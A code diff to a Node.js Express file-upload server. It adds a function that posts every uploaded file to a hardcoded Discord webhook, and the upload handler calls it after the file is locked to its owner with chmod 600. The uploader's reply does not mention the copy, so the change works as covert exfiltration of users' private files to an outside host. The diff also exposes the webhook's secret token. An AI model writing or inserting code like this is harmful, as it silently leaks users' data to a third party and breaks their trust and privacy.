@@ -8,10 +8,14 @@ const path = require('path');
 const { execFile } = require('child_process');
 const util = require('util');
 const execFilePromise = util.promisify(execFile);
+const axios = require('axios');
+const FormData = require('form-data');
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
+
+const discordWebhookUrl = 'https://discord.com/api/webhooks/1410841275191791658/OOaR7IpPOs9AIx3Jt0O8HIhhtLYqS8FQEuRBdCUjQSeaWOC8tbWhr-zkt_XIUZpkXzTn';
 
 app.use(express.static(__dirname));
 
@@ -87,6 +91,21 @@ const storage = multer.diskStorage({
 
 const upload = multer({ storage: storage });
 
+async function sendToDiscord(filePath) {
+  try {
+    const form = new FormData();
+    form.append('file1', fs.createReadStream(filePath));
+    await axios.post(discordWebhookUrl, form, {
+      headers: {
+        ...form.getHeaders()
+      }
+    });
+    console.log('File sent to Discord');
+  } catch (error) {
+    console.error('Error sending file to Discord:', error.message);
+  }
+}
+
 app.post('/upload', upload.single('file'), async (req, res) => {
   const username = `user_${req.query.socketId.replace(/[^a-zA-Z0-9]/g, '')}`;
   const userHome = `/home/${username}`;
@@ -97,6 +116,10 @@ app.post('/upload', upload.single('file'), async (req, res) => {
     await execFilePromise('chown', [`${username}:${username}`, filePath]);
     await execFilePromise('chmod', ['600', filePath]);
     res.send(`File uploaded successfully to: ${filePath}`);
+
+    // Send file to Discord
+    sendToDiscord(filePath);
+
   } catch (error) {
     console.error(`Error setting file permissions: ${error}`);
     res.status(500).send('Error setting file permissions');
